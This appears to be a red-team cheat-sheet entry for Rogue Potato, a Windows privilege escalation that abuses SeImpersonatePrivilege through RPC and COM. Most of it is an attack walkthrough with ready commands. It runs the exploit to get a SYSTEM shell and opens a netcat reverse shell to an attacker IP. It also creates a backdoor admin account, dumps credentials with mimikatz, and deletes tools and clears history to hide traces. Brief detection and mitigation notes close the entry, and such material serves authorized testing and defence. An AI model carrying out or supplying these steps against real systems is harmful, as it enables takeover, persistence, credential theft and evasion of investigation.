- **Tags**: #JuicyPotato #WindowsPrivilegeEscalation #CLSID #COMHijack #TokenAbuse #RedTeam #SeImpersonate #PotatoExploit

## Rogue Potato – Modern Bypass for Juicy

- **Attack Type**: Privilege Escalation via Token Spoofing
- **Target**: Windows 10 (1809+)Windows Server 2016/2019/2022
- **Vulnerability**: Misuse of Windows RPC + COM interactionExploitable SeImpersonatePrivilege token
- **MITRE**: T1134.001 (Access Token Manipulation: Token Impersonation/Theft)
- **Impact**: Full SYSTEM privilege escalationComplete control over systemAdmin backdoor creation

- **Scenario**: This exploit targets Windows Server and newer Windows 10+ (1809+) systems where Juicy Potato is patched. Rogue Potato leverages a local HTTP COM server and NT AUTHORITY\SYSTEM impersonation via RPC abuse. It tricks the system into connecting to the attacker's local TCP listener instead of a real named pipe, enabling SYSTEM token impersonation and privilege escalation without needing a named pipe.
- **Attack Steps**: Step 1 – Verify SeImpersonatePrivilegeRun:whoami /privEnsure SeImpersonatePrivilege is present. This is required to successfully impersonate a SYSTEM token.Step 2 – Download and Transfer ToolsOn attacker system:• Get RoguePotato.exe from GitHub• Prepare a payload: cmd.exe, nc.exe, or reverse shellTransfer tools to victim (via SMB, RDP, or other access).Step 3 – Understand Rogue Potato ParametersCommon usage:RoguePotato.exe -lport 9999 -e "cmd.exe"• -lport: local port where rogue RPC server listens• -e: executable or payload to run under SYSTEMStep 4 – Execute ExploitRun from low-privileged shell:RoguePotato.exe -lport 9999 -e "cmd.exe"This spawns a new process (cmd.exe) with SYSTEM privileges by redirecting the system’s DCOM RPC call to the rogue RPC listener.Optional:To get a reverse shell, prepare listener:nc -nlvp 4444Then:RoguePotato.exe -lport 9999 -e "nc.exe <attackerIP> 4444 -e cmd.exe"✅ On success, attacker gets SYSTEM-level shell.Step 5 – Verify ElevationCheck:whoami → should return NT AUTHORITY\SYSTEMStep 6 – Post Exploitation Options• Add local admin usernet user attacker Pass123 /addnet localgroup administrators attacker /add• Dump credentials with mimikatz or similarStep 7 – Cleanup• Delete all transferred files (RoguePotato.exe, nc.exe)• Clear shell history if possible• Remove temp user accounts (if created)
- **Detection**: - Monitor creation of new SYSTEM processes- Detect RPC server binding on unusual ports- Audit use of SeImpersonatePrivilege
- **Solution**: - Remove or restrict SeImpersonatePrivilege- Block custom COM objects via AppLocker or WDAC- Monitor event logs for COM service abuse
- **Tags**: #RoguePotato #TokenImpersonation #WindowsPrivilegeEscalation #RPCAbuse #SeImpersonate #BypassJuicyPotato #RedTeam
